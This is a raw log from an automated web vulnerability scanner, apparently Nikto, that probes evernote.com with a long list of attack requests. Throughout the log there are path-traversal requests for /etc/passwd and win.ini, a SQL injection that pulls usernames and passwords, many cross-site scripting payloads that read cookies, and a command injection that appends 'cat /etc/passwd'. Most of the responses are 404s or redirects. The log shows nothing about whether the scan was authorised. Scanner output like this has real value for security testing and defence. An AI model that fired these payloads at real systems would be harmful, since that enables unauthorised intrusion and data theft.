++ /.cobalt/sysManage/../admin/.htaccess - Redirects (302) to https://evernote.com/.cobalt/admin/.htaccess , Cobalt RaQ 4 server manager allows any files to be retrieved by using the path through the .cobalt directory.
++ /DomainFiles/*//../../../../../../../../../../etc/passwd - Redirects (302) to https://evernote.com/etc/passwd , Communigate Pro 4.0b to 4.0.2 allow any file to be retrieved from the remote system.
++ /index.php?download=/winnt/win.ini - Redirects (307) to / , Snif 1.2.4 allows any file to be retrieved from the web server.
++ /index.php?download=/windows/win.ini - Redirects (307) to / , Snif 1.2.4 allows any file to be retrieved from the web server.
++ /index.php?download=/etc/passwd - Redirects (307) to / , Snif 1.2.4 allows any file to be retrieved from the web server.
++ /index.php?|=../../../../../../../../../etc/passwd - Redirects (307) to / , Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.
++ /index.php?page=../../../../../../../../../../etc/passwd - Redirects (307) to / , The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
++ /index.php?page=../../../../../../../../../../boot.ini - Redirects (307) to / , The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
++ /index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd - Redirects (307) to / , Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.
++ /search?NS-query-pat=../../../../../../../../../../etc/passwd - Redirects (307) to /features/search , The iPlanet server allows arbitrary files to be retrieved through the search functionality. Install 4.1 SP10+ or 6.0 SP3+
++ /search?NS-query-pat=..\..\..\..\..\..\..\..\..\..\boot.ini - Redirects (307) to /features/search , The iPlanet server allows arbitrary files to be retrieved through the search functionality. Install 4.1 SP10+ or 6.0 SP3+
++ /..\..\..\..\..\..\temp\temp.class - Redirects (302) to https://evernote.com/temp/temp.class , Cisco ACS 2.6.x and 3.0.1 (build 40) allows authenticated remote users to retrieve any file from the system. Upgrade to the latest version.
++ /../../../../../../../../../../etc/passwd - Redirects (302) to https://evernote.com/etc/passwd , It is possible to read files on the server by adding ../ in front of file name.
++ /%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini - Redirects (302) to https://evernote.com/windows/win.ini , Attackers can read any file on the system. Upgrade to Analogx 1.07 or higher.
++ /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd - Redirects (302) to https://evernote.com/etc/passwd , Web server allows reading of files by sending encoded '../' requests. This server may be Boa (boa.org).
++ /ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini - Redirects (302) to https://evernote.com/ca//////////windows///win.ini , It is possible to read files on the server by adding through directory traversal by adding multiple /\\.. in front of file name.
++ /ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd - Redirects (302) to https://evernote.com/////etc///passwd , It is possible to read files on the server by adding through directory traversal by adding multiple /\\.. in front of file name.
++ /ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini - Redirects (302) to https://evernote.com//winnt///win.ini , It is possible to read files on the server by adding through directory traversal by adding multiple /\\.. in front of file name.
++ /index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* - Redirects (307) to / , My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection.
++ /index.php?option=search&searchword=<script>alert(document.cookie);</script> - Redirects (307) to / , Mambo Site Server 4.0 build 10 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /index.php?dir=<script>alert('Vulnerable')</script> - Redirects (307) to / , Auto Directory Index 1.2.3 and prior are vulnerable to XSS attacks.
+V:Mon Sep 25 16:24:40 2023 - 404 for GET:	/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
+V:Mon Sep 25 16:24:41 2023 - 404 for GET:	/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
+V:Mon Sep 25 16:24:42 2023 - 404 for GET:	/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
+V:Mon Sep 25 16:24:43 2023 - 404 for GET:	/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:24:44 2023 - 404 for GET:	/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview
+V:Mon Sep 25 16:24:44 2023 - 404 for GET:	/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:24:45 2023 - 404 for GET:	/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
+V:Mon Sep 25 16:24:46 2023 - 404 for GET:	/shop/normal_html.cgi?file=&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;
+V:Mon Sep 25 16:24:47 2023 - 404 for GET:	/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P
+V:Mon Sep 25 16:24:48 2023 - 404 for POST:	/servlet/custMsg?guestName=<script>alert(\"Vulnerable\")</script>
+V:Mon Sep 25 16:24:49 2023 - 404 for POST:	/servlet/CookieExample?cookiename=<script>alert(\"Vulnerable\")</script>
+V:Mon Sep 25 16:24:50 2023 - 404 for GET:	/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:24:51 2023 - 404 for GET:	/search/index.cfm?<script>alert(\"Vulnerable\")</script>
+V:Mon Sep 25 16:24:51 2023 - 308 for GET:	/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>
+V:Mon Sep 25 16:24:52 2023 - 404 for GET:	/search.php?zoom_query=<script>alert(\"hello\")</script>
+V:Mon Sep 25 16:24:53 2023 - 404 for GET:	/search.php?searchstring=<script>alert(document.cookie)</script>
+V:Mon Sep 25 16:24:54 2023 - 404 for GET:	/search.php?searchfor=\"><script>alert(1776)</script>
+V:Mon Sep 25 16:24:55 2023 - 404 for GET:	/search.asp?term=<%00script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:24:56 2023 - 404 for GET:	/script>alert('Vulnerable')</script>.cfm
+V:Mon Sep 25 16:24:56 2023 - 404 for GET:	/samples/search.dll?query=<script>alert(document.cookie)</script>&logic=AND
+V:Mon Sep 25 16:24:57 2023 - 404 for GET:	/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:24:58 2023 - 404 for GET:	/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+V:Mon Sep 25 16:24:58 2023 - 400 for GET:	/postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft Utilities\"%3<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:24:59 2023 - 404 for GET:	/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
+V:Mon Sep 25 16:25:00 2023 - 404 for GET:	/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1
+V:Mon Sep 25 16:25:01 2023 - 404 for GET:	/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
+V:Mon Sep 25 16:25:02 2023 - 404 for GET:	/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit
+V:Mon Sep 25 16:25:03 2023 - 404 for GET:	/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:04 2023 - 404 for GET:	/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]
+V:Mon Sep 25 16:25:05 2023 - 404 for GET:	/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:06 2023 - 404 for GET:	/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:06 2023 - 404 for GET:	/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>
+V:Mon Sep 25 16:25:08 2023 - 404 for GET:	/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:08 2023 - 404 for GET:	/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E
+V:Mon Sep 25 16:25:09 2023 - 404 for GET:	/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:10 2023 - 404 for GET:	/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:11 2023 - 404 for GET:	/phpimageview.php?pic=javascript:alert(8754)
+V:Mon Sep 25 16:25:12 2023 - 404 for GET:	/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>
+V:Mon Sep 25 16:25:13 2023 - 404 for GET:	/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:13 2023 - 404 for GET:	/phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>
+V:Mon Sep 25 16:25:14 2023 - 404 for GET:	/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:15 2023 - 404 for GET:	/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:16 2023 - 404 for GET:	/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
+V:Mon Sep 25 16:25:17 2023 - 404 for GET:	/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:17 2023 - 404 for GET:	/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
+V:Mon Sep 25 16:25:18 2023 - 404 for GET:	/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
+V:Mon Sep 25 16:25:19 2023 - 308 for GET:	/node/view/666\"><script>alert(document.domain)</script>
++ /node/view/666\"><script>alert(document.domain)</script>: Drupal 4.2.0 RC is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+V:Mon Sep 25 16:25:20 2023 - 404 for GET:	/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>
+V:Mon Sep 25 16:25:21 2023 - 404 for GET:	/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>
+V:Mon Sep 25 16:25:22 2023 - 404 for GET:	/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
+V:Mon Sep 25 16:25:22 2023 - 404 for GET:	/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
+V:Mon Sep 25 16:25:23 2023 - 404 for GET:	/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
+V:Mon Sep 25 16:25:24 2023 - 404 for GET:	/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
+V:Mon Sep 25 16:25:25 2023 - 404 for GET:	/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:26 2023 - 404 for GET:	/msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:27 2023 - 404 for GET:	/msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:27 2023 - 404 for GET:	/msadm/domain/index.php3?account_name=\"><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:28 2023 - 404 for GET:	/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
+V:Mon Sep 25 16:25:29 2023 - 404 for GET:	/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:30 2023 - 404 for GET:	/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:31 2023 - 404 for GET:	/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:32 2023 - 404 for GET:	/modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:33 2023 - 404 for GET:	/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:34 2023 - 404 for GET:	/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2
+V:Mon Sep 25 16:25:34 2023 - 404 for GET:	/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:35 2023 - 404 for GET:	/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:36 2023 - 404 for GET:	/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:37 2023 - 404 for GET:	/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:38 2023 - 404 for GET:	/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:39 2023 - 404 for GET:	/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0
+V:Mon Sep 25 16:25:39 2023 - 404 for GET:	/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:40 2023 - 404 for GET:	/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|
+V:Mon Sep 25 16:25:41 2023 - 404 for GET:	/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>
+V:Mon Sep 25 16:25:42 2023 - 404 for GET:	/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:43 2023 - 404 for GET:	/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:44 2023 - 404 for GET:	/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test
+V:Mon Sep 25 16:25:45 2023 - 404 for GET:	/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:45 2023 - 404 for GET:	/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:46 2023 - 404 for GET:	/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:47 2023 - 404 for GET:	/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index
+V:Mon Sep 25 16:25:48 2023 - 404 for GET:	/members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22
+V:Mon Sep 25 16:25:49 2023 - 404 for GET:	/megabook/admin.cgi?login=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:49 2023 - 404 for GET:	/mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;
+V:Mon Sep 25 16:25:50 2023 - 404 for GET:	/mailman/listinfo/<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:51 2023 - 404 for GET:	/ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\"Vulnerable\")</script>
+V:Mon Sep 25 16:25:52 2023 - 404 for GET:	/launch.jsp?NFuse_Application=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:53 2023 - 404 for GET:	/launch.asp?NFuse_Application=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:54 2023 - 308 for GET:	/jigsaw/
+V:Mon Sep 25 16:25:55 2023 - 404 for GET:	/isapi/testisa.dll?check1=<script>alert(document.cookie)</script>
+V:Mon Sep 25 16:25:55 2023 - 307 for GET:	/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+V:Mon Sep 25 16:25:56 2023 - 307 for GET:	/index.php?file=Liens&op=\"><script>alert('Vulnerable');</script>
+V:Mon Sep 25 16:25:57 2023 - 307 for GET:	/index.php?catid=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
+V:Mon Sep 25 16:25:58 2023 - 307 for GET:	/index.php?action=storenew&username=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:25:58 2023 - 400 for GET:	/index.php?action=search&searchFor=\"><script>alert('Vulnerable')</script >
+V:Mon Sep 25 16:25:58 2023 - 308 for GET:	/index.php/\"><script><script>alert(document.cookie)</script><
++ /index.php/\"><script><script>alert(document.cookie)</script><: eZ publish v3 and prior allow Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+V:Mon Sep 25 16:25:59 2023 - 308 for GET:	/index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>
+V:Mon Sep 25 16:26:00 2023 - 308 for GET:	/index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search
+V:Mon Sep 25 16:26:00 2023 - 404 for GET:	/include.php?path=contact.php&contact_email=\">&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+V:Mon Sep 25 16:26:01 2023 - 404 for GET:	/html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
+V:Mon Sep 25 16:26:02 2023 - 404 for GET:	/html/chatheader.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
+V:Mon Sep 25 16:26:03 2023 - 404 for GET:	/html/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:03 2023 - 308 for GET:	/guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E
+V:Mon Sep 25 16:26:04 2023 - 404 for GET:	/gallery/search.php?searchstring=<script>alert(document.cookie)</script>
+V:Mon Sep 25 16:26:05 2023 - 404 for GET:	/friend.php?op=SiteSent&fname=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:05 2023 - 404 for GET:	/forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22
+V:Mon Sep 25 16:26:06 2023 - 404 for GET:	/forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+V:Mon Sep 25 16:26:07 2023 - 404 for GET:	/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:08 2023 - 404 for GET:	/forums/browse.php?fid=3&tid=46&go=<script>JavaScript:alert('Vulnerable');</script>
+V:Mon Sep 25 16:26:09 2023 - 404 for GET:	/esp?PAGE=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+V:Mon Sep 25 16:26:09 2023 - 404 for GET:	/error/500error.jsp?et=1<script>alert('Vulnerable')</script>;
+V:Mon Sep 25 16:26:10 2023 - 404 for GET:	/downloads/pafiledb.php?action=rate&id=4?\"&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"
+V:Mon Sep 25 16:26:11 2023 - 404 for GET:	/downloads/pafiledb.php?action=email&id=4?\"&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"
+V:Mon Sep 25 16:26:12 2023 - 404 for GET:	/downloads/pafiledb.php?action=download&id=4?\"&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"
+V:Mon Sep 25 16:26:13 2023 - 404 for GET:	/download.php?sortby=&dcategory=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:14 2023 - 404 for GET:	/default.php?info_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
+V:Mon Sep 25 16:26:15 2023 - 404 for GET:	/default.php?error_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
+V:Mon Sep 25 16:26:16 2023 - 404 for GET:	/comments/browse.php?fid=2&tid=4&go=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
+V:Mon Sep 25 16:26:17 2023 - 404 for GET:	/comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview
+V:Mon Sep 25 16:26:17 2023 - 404 for GET:	/cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script>
+V:Mon Sep 25 16:26:18 2023 - 400 for GET:	/cleartrust/ct_logon.asp?CTAuthMode=BASIC&CTLoginErrorMsg=xx&ct_orig_uri=\">< script>alert(1)/script><\"
+V:Mon Sep 25 16:26:19 2023 - 404 for GET:	/chat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>
+V:Mon Sep 25 16:26:19 2023 - 404 for GET:	/cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:20 2023 - 404 for GET:	/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:21 2023 - 404 for GET:	/cgi-bin/.cobalt/message/message.cgi?info=%3Cscript%3Ealert%28%27alert%27%29%3B%3C/script%3E
+V:Mon Sep 25 16:26:22 2023 - 404 for GET:	/calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05
+V:Mon Sep 25 16:26:23 2023 - 404 for GET:	/ca000007.pl?ACTION=SHOWCART&REFPAGE=\"><script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:23 2023 - 404 for GET:	/ca000001.pl?ACTION=SHOWCART&hop=\"><script>alert('Vulnerable')</script>&PATH=acatalog%2f
+V:Mon Sep 25 16:26:24 2023 - 404 for GET:	/bb000001.pl<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:24 2023 - 400 for GET:	/article.php?sid=\"><Img Src=javascript:alert('Vulnerable')><Img Src=\"
+V:Mon Sep 25 16:26:25 2023 - 404 for GET:	/article.cfm?id=1'<script>alert(document.cookie);</script>
+V:Mon Sep 25 16:26:26 2023 - 404 for GET:	/apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:27 2023 - 404 for GET:	/anthill/login.php
+V:Mon Sep 25 16:26:27 2023 - 400 for GET:	/admin/login.php?path=\"></form><form name=a><input name=i value=XSS>&lt;script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:28 2023 - 404 for GET:	/addressbook/index.php?surname=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:29 2023 - 404 for GET:	/addressbook/index.php?name=<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:30 2023 - 404 for GET:	/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:30 2023 - 404 for GET:	/a?<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:31 2023 - 404 for GET:	/a.jsp/<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:26:32 2023 - 200 for GET:	/?mod=<script>alert(document.cookie)</script>&op=browse
++ /?mod=<script>alert(document.cookie)</script>&op=browse - 200/OK Response could be Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+V:Mon Sep 25 16:26:33 2023 - 404 for GET:	/<script>alert('Vulnerable')</script>.thtml
+V:Mon Sep 25 16:26:34 2023 - 404 for GET:	/<script>alert('Vulnerable')</script>.shtml
+V:Mon Sep 25 16:26:35 2023 - 404 for GET:	/<script>alert('Vulnerable')</script>.jsp
+V:Mon Sep 25 16:26:35 2023 - 404 for GET:	/<script>alert('Vulnerable')</script>.aspx
+V:Mon Sep 25 16:26:36 2023 - 308 for GET:	//profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+V:Mon Sep 25 16:26:37 2023 - 308 for GET:	//comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+V:Mon Sep 25 16:26:37 2023 - 404 for GET:	/&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
+V:Mon Sep 25 16:26:38 2023 - 404 for GET:	/%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
+V:Mon Sep 25 16:26:39 2023 - 404 for GET:	/%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+V:Mon Sep 25 16:26:40 2023 - 404 for GET:	/%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+V:Mon Sep 25 16:26:41 2023 - 404 for GET:	/%22%3cscript%3ealert(%22xss%22)%3c/script%3e
+V:Mon Sep 25 16:26:41 2023 - 308 for GET:	/%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
+V:Mon Sep 25 16:26:42 2023 - 404 for GET:	/add_user.php
+V:Mon Sep 25 16:26:43 2023 - 404 for GET:	/cfdocs/expeval/displayopenedfile.cfm
+V:Mon Sep 25 16:26:44 2023 - 404 for GET:	/cfdocs/expeval/sendmail.cfm
+V:Mon Sep 25 16:26:44 2023 - 404 for GET:	/cgi-bin/bigconf.cgi
+V:Mon Sep 25 16:26:45 2023 - 308 for GET:	/ammerum/
+V:Mon Sep 25 16:26:46 2023 - 308 for GET:	/ariadne/
+V:Mon Sep 25 16:26:47 2023 - 404 for GET:	/cbms/cbmsfoot.php
+V:Mon Sep 25 16:26:47 2023 - 404 for GET:	/cbms/changepass.php
+V:Mon Sep 25 16:26:48 2023 - 404 for GET:	/cbms/editclient.php
+V:Mon Sep 25 16:26:49 2023 - 404 for GET:	/cbms/passgen.php
+V:Mon Sep 25 16:26:50 2023 - 404 for GET:	/cbms/realinv.php
+V:Mon Sep 25 16:26:51 2023 - 404 for GET:	/cbms/usersetup.php
+V:Mon Sep 25 16:26:52 2023 - 404 for GET:	/cgi-bin-sdb/printenv
+V:Mon Sep 25 16:26:53 2023 - 404 for GET:	/ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C
+V:Mon Sep 25 16:26:53 2023 - 404 for GET:	/db/users.dat
+V:Mon Sep 25 16:26:54 2023 - 200 for GET:	/?sql_debug=1
++ /?sql_debug=1 - 200/OK Response could be The PHP-Nuke install may allow attackers to enable debug mode and disclose sensitive information by adding sql_debug=1 to the query string.
+V:Mon Sep 25 16:26:55 2023 - 404 for GET:	/a_security.htm
+V:Mon Sep 25 16:26:56 2023 - 404 for GET:	/Admin_files/order.log
+V:Mon Sep 25 16:26:57 2023 - 404 for GET:	/admin.html
+V:Mon Sep 25 16:26:58 2023 - 404 for GET:	/admin/cplogfile.log
+V:Mon Sep 25 16:26:58 2023 - 404 for GET:	/admin/system_footer.php
+V:Mon Sep 25 16:26:59 2023 - 404 for GET:	/cfdocs/snippets/fileexists.cfm
+V:Mon Sep 25 16:27:00 2023 - 404 for GET:	/cgi-bin/MachineInfo
+V:Mon Sep 25 16:27:01 2023 - 404 for GET:	/chat/!nicks.txt
+V:Mon Sep 25 16:27:01 2023 - 404 for GET:	/chat/!pwds.txt
+V:Mon Sep 25 16:27:02 2023 - 404 for GET:	/chat/data/usr
+V:Mon Sep 25 16:27:03 2023 - 404 for GET:	/com
+V:Mon Sep 25 16:27:04 2023 - 404 for GET:	/COM
+V:Mon Sep 25 16:27:05 2023 - 404 for GET:	/config.php
+V:Mon Sep 25 16:27:05 2023 - 308 for GET:	/config/
+V:Mon Sep 25 16:27:06 2023 - 404 for GET:	/cplogfile.log
+V:Mon Sep 25 16:27:07 2023 - 404 for GET:	/cutenews/index.php?debug
+V:Mon Sep 25 16:27:07 2023 - 404 for GET:	/examples/jsp/snp/anything.snp
+V:Mon Sep 25 16:27:08 2023 - 404 for GET:	/file-that-is-not-real-2002.php3
+V:Mon Sep 25 16:27:09 2023 - 307 for GET:	/index.php?sql_debug=1
+V:Mon Sep 25 16:27:10 2023 - 404 for GET:	/cfdocs/snippets/viewexample.cfm
+V:Mon Sep 25 16:27:11 2023 - 404 for GET:	/chassis/config/GeneralChassisConfig.html
+V:Mon Sep 25 16:27:11 2023 - 404 for GET:	/hp/device/this.LCDispatcher
+V:Mon Sep 25 16:27:12 2023 - 404 for GET:	/cfdocs/snippets/evaluate.cfm
+V:Mon Sep 25 16:27:13 2023 - 404 for GET:	/cfide/Administrator/startstop.html
+V:Mon Sep 25 16:27:14 2023 - 404 for GET:	/Mem/dynaform/FileExplorer.htm
+V:Mon Sep 25 16:27:15 2023 - 404 for GET:	/cd-cgi/sscd_suncourier.pl
+V:Mon Sep 25 16:27:16 2023 - 404 for GET:	/cgi-bin/handler
+V:Mon Sep 25 16:27:16 2023 - 400 for GET:	/cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download
